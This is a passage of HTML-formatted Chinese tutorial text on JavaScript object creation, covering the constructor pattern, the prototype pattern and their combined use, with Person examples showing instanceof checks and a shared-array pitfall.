; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"color: rgb(0, 0, 136);\">log</span>(person1.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0);\">//true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">log</span>(person2.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对象的<span style=\"color: rgb(0, 128, 255);\">constructor</span>属性最初是用来标识对象类型的。但是，提到检测对象类型，还是<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符比较可靠一些。我们在这个例子中创建的对象都是<span style=\"color: rgb(0, 128, 255);\">Object</span>对象的实例，也是<span style=\"color: rgb(0, 128, 255);\">Person</span>对象的实例，这一点通过instanceof操作符可以验证。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；而这正是构造函数模式胜过工厂模式的地方。在这个例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>之所以同是<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，是因为所有的对象都继承自Object。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造函数的主要问题，就是每个方法都要在实例上重新创建一遍，造成内存浪费。在前面的例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>都有一个名为<span style=\"color: rgb(0, 128, 255);\">sayName()</span>的方法，但是两个方法不是同一<span style=\"color: rgb(0, 128, 255);\">Function</span>的实例。不要忘了ECMAScript中的函数也是对象，因此每定义一个函数，也就是实例化了一个对象，从逻辑角度讲，此时的构造函数可以这样定义：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">Function</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"alert(this.name);\"</span>) &nbsp; </span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;//与声明函数在逻辑上是等价的</span>}</span></code></p></pre></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从这个角度来看构造函数，更容易看明白每个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例都会包含一个不同的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的本质。说明白些，会导致不同的作用域链和标识符解析，但是创建<span style=\"color: rgb(0, 128, 255);\">Function</span>新实例的机制仍然是相同的。因此，不同实例上的同名函数是不相等的，以下代码可以证实这一点。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">alert(person1<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span> == person2<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span>)<span class=\"\" style=\"color: rgb(136, 0, 0);\">; &nbsp;//false</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然而，创建两个完成同样任务的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的确没有必要；况且有<span style=\"color: rgb(0, 128, 255);\">this</span>对象在，根本不用在执行代码前就把函数绑定到特定的对象上。因此，可以像下面这样，通过把函数定义转移到构造函数外部来解决这个问题。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = sayName;</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span> sayName<span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);\n}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样做解决了多个函数解决相同问题的问题，但是有产生了新的问题，在全局作用域中实际上只被某个对象调用，这让全局对象有点名不副实。更让人无法接受的是：如果对象需要定义很多方法，那么就要定义很多全局函数，于是我们这个自定义的引用类型就丝毫没有封装性可言了。好在这些问题可以使用原型模式来解决。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>三、原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify;\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify; color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们创建的每个函数都有一个<span style=\"text-align: justify; color: rgb(0, 128, 255);\">prototype</span>（原型）属性，这个属性是一个指针，指向一个对象，而这个对象的用途是包含可以由特定类型的所有实例共享的属性和方法。使用原型对象的实例就是让所有实例共享它所包含的属性和方法。换句话说，不必在构造函数中定义对象的实例信息，而是可以将这些信息直接添加到原型对象中，如下所示：</span><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br>}<br>Person.prototype.name = <span class=\"\" style=\"color: rgb(0, 136, 0);\">\"wei\"</span>;<br>Person.prototype.age = <span class=\"\" style=\"color: rgb(0, 102, 102);\">27</span>;<br>Person.prototype.job = <span class=\"\" style=\"color: rgb(0, 136, 0);\">\"Software\"</span>;<br>Person.prototype.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp;<br> &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br>}<br> <br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person();</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//\"wei\"</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\"><br>var</span> person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person();</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person2.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//\"wei\"</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><br><span style=\"font-size: 14px;\">alert(person1.sayName == person2.sayName);</span></code></p></pre></section></section></section></section></section></section></section></section></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"box-sizing: border-box;\"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在此，我们将<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法和所有的属性直接添加在了<span style=\"color: rgb(0, 128, 255);\">Person</span>的<span style=\"color: rgb(0, 128, 255);\">prototype</span>属性中，构造函数变成了空函数。即便如此，我们仍然可以通过构造函数来创建新对象，而且新对象还会具有相同的属性和方法。但是与构造函数不同的是，新对象的这些属性和方法是由所有实例共享的。换句话说，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>访问的都是同一组属性和同一个<span style=\"color: rgb(0, 128, 255);\">sayName()</span>函数。要理解原型模式的工作原理，就必须先理解ECMAScript中原型对象的性质。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型对象的本性由于篇幅太长将会在下一章节详细分析。上面我们说了原型模式的好处，接下来我们来看一下原型模式的缺点。原型模式省略了为构造函数传递参数的这一环节，结果所有实例在默认情况下都具有相同的属性值。这会在某些程度上带来一种不便，这并不是原型模式最大的问题，因为如果我们想为一个通过原型模式创建的对象添加属性时，添加的这个属性就会屏蔽原型对象的保存的同名属性。换句话说，就是添加的这个属性会阻止我们去访问原型中的属性，但并不会改变原型中的属性。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型模式最大的问题是由其共享的本质所导致的。原型中所有的属性被很多实例共享，这种共享对函数非常合适，对包含基本值的属性也说的过去，但是对引用类型的属性值来说问题就比较突出了，下面我们来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\">function</span> Person(){\n}\nPerson.prototype = { &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">constructor</span>:Person, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">name</span>:<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"wei\"</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">age</span>:<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">friends</span>:[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"乾隆\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"康熙\"</span>], &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">sayName</span>:<span class=\"\" style=\"box-sizing: border-box;\">function</span>(){\n &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;}\n}<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();\nperson1.friends.push(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"嬴政\"</span>);<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"乾隆\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"康熙\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"嬴政\"</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"乾隆\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"康熙\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"嬴政\"</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">true</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子中，<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>对象有一个名为<span style=\"color: rgb(0, 128, 255);\">friends</span>的属性，该属性包含一个字符串数组。然后创建了两个<span style=\"color: rgb(0, 128, 255);\">Person</span>的实例，接着修改<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>引用的数组，向数组中添加一个字符串，由于数组存在于<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>中而不是<span style=\"color: rgb(0, 128, 255);\">person1</span>中，所以<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>也会被修改。但是一般每个对象都是要有属于自己的属性的，所以我们很少看到有人单独使用原型模式来创建对象。</p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p></section></section><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>四、组合使用构造函数模式和原型模式</strong></span><span style=\"color: rgb(136, 136, 136);\"></span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义类型最常见的方式就是组合使用构造函数模式与原型模式。构造函数模式用于定义实例属性，原型模式用于定义方法和共享的属性。结果，每个实例都会有自己的一份实例属性的副本，但同时又共享着对方法的引用，最大限度的节省了内存。另外，这种混成模式还支持向构造函数传递参数；可谓是集两种模式之长。下面的代码重写了前面的例子：</span></p></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">function Person(name, age){ &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>];</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">Person.prototype = { &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;constructor</span>:Person, &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;sayName</span>:function(){</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"wei\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"bu\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">25</span>);</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"嬴政\"</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"嬴政\"</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" 